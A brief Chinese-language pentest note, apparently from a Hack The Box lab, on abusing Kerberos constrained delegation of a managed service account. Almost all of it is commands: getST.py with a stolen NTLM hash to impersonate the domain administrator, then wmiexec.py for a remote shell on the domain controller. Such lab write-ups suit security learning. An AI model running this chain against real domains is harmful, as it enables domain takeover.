# AllowedToDelegate

大概率获得全程hash

组托管用户，可以伪造凭据，需要spn值，可以通过blood中的Allowed To Delegate获取

```clike
getST.py -dc-ip 10.129.95.154 -spn www/dc.intelligence.htb -hashes :80c1d736d9988b5763b9aa74362db287 -impersonate administrator intelligence.htb/【用户名】

-impersonate administrator是我想要获取票据的用户

如果出现时钟偏差
sudo ntpdate 10.129.163.131
```

而后利用刚才生成的**票据登陆**

```clike
export KRB5CCNAME=administrator.ccache
echo "10.129.163.131 dc.intelligence.htb" >> /etc/hosts
klist
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```
